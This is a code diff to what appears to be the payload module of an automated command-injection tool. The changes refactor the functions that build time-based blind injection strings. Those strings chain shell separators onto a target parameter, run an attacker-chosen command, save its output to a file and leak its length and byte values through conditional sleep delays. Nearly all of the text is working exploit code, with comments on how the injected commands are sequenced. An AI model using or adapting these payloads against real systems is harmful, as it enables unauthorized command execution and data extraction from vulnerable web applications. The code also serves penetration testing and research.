@@ -87,7 +87,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   else:
     if separator in (";", "\n", "\r\n") :
       payload = (separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
@@ -97,11 +97,11 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       # The write leaves no output of its own, so the read right after it reads as one word -
       # which sequences the two without an operator between them.
       payload = separator + tb_payloads._timed_comparison(timesec, j,
-                  tb_payloads._length_arg_expr(settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
+                  tb_payloads._length_arg_expr(settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
                                                settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX))
     elif separator == "&":
       payload = (separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
@@ -112,7 +112,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       ampersand = "&"
       payload = (ampersand +
                 "sleep 0" + separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "} " + separator +
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
@@ -193,20 +193,22 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 )
   else:
     settings.USER_APPLIED_CMD = cmd
+    # The output and its decimals are printed through checks.print_value() and print_words(), so the
+    # payload uses one printing command only and the output is written back as it was printed.
     if separator in (";", "\n", "\r\n") :
       arith_operator = "<=" if operator == "-le" else "=="
       payload = (separator +
                 # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
                 settings.BYTE_LOCALE_EXPORTED + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
-                "echo \"" + output_text() + "\" >" + OUTPUT_TEXTFILE + separator +
+                checks.print_value("\"" + output_text() + "\"") + " >" + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(j) + arith_operator + settings.RANDOM_VAR_GENERATOR + "1)))" + separator +
                 # Transform to ASCII
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
+                checks.print_words("$" + settings.RANDOM_VAR_GENERATOR + "1") + " >" + OUTPUT_TEXTFILE
                 )
     elif separator in ("&", "&&", settings.PIPE_SEPARATOR) and checks.substitution_nests():
       arith_operator = "<=" if operator == "-le" else "=="
@@ -215,9 +217,9 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       # the decimals are written last - after the delay has been scaled, since the word carrying
       # them is built before 'sleep' is run. Nothing here chains, so nothing is smuggled.
       measured = (settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
-                  settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
+                  settings.CMD_SUB_PREFIX + checks.print_value("\"" + settings.CMD_SUB_PREFIX + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "\"") + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
                   settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX)
-      to_decimals = (settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
+      to_decimals = (settings.CMD_SUB_PREFIX + checks.print_words(settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX) +
                      settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX)
       payload = (separator +
                 tb_payloads._timed_comparison(timesec, j, tb_payloads._length_arg_expr(measured), arith_operator) +
@@ -227,14 +229,14 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       payload = (separator +
                 settings.BYTE_LOCALE_EXPORTED + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" + " " + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "&&" +
-                "echo \"" + output_text() + "\" >" + OUTPUT_TEXTFILE + "&&" +
+                checks.print_value("\"" + output_text() + "\"") + " >" + OUTPUT_TEXTFILE + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
                 "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
                 "sleep " + str(timesec) + "&&" +
                 # Transform to ASCII
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
-                "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
+                checks.print_words("$" + settings.RANDOM_VAR_GENERATOR + "1") + " >" + OUTPUT_TEXTFILE
                 )
 
     elif separator == "&&" :
@@ -243,7 +245,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 # The command the "&&" needs on its left, pinning while it is there.
                 settings.BYTE_LOCALE_EXPORTED + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
-                "echo \"" + output_text() + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
+                checks.print_value("\"" + output_text() + "\"") + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
@@ -251,7 +253,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "sleep " + str(timesec) + separator +
                 # Transform to ASCII
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t u1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "echo $" + settings.RANDOM_VAR_GENERATOR + "1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
+                checks.print_words("$" + settings.RANDOM_VAR_GENERATOR + "1") + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
                 )
 
     else:
@@ -472,7 +474,7 @@ def oracle_write(separator, cmd, OUTPUT_TEXTFILE):
   payload = (separator +
             var + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
             " " + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
-            "echo \"" + output_text() + "\" >" + OUTPUT_TEXTFILE
+            checks.print_value("\"" + output_text() + "\"") + " >" + OUTPUT_TEXTFILE
             )
   return checks.terminate_payload(payload, separator)
 
@@ -496,7 +498,7 @@ def oracle_decision(separator, TAG, output_length, OUTPUT_TEXTFILE, holds=True):
     return write + bb_payloads.get_length(checks.WINDOWS_CHAIN, "type " + OUTPUT_TEXTFILE, expected, "-eq")
   var = settings.RANDOM_VAR_GENERATOR
   payload = (separator +
-            var + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+            var + "=" + settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
             var + "1=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
             bb_payloads._decide(separator, str(expected) + " -eq ${#" + var + "1}")
             )
